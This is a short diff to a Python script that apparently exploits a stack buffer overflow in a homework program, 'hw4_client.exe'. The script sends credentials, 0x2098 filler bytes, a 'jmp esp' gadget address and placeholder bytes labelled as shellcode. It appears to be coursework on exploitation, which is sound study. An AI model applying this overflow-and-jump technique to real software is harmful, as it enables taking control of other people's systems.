@@ -20,7 +20,9 @@ exe_path = "hw4_client.exe"
 process = subprocess.Popen(exe_path, stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
 input()
 
-payload= "archer\n56M9JNQ60KB7APLC\nPEEK\n"+("a" * 0X2098) + "bP (" + "E" * 100
+payload= "archer\n56M9JNQ60KB7APLC\nPEEK\n"+("a" * 0X2098) + "( Pb" + "E" * 100
+# "( Pb" is the gadget address for jmp esp
+# "E" * 100 is the shell code
 
 # Provide user_name
 output, error = process.communicate(input= payload)
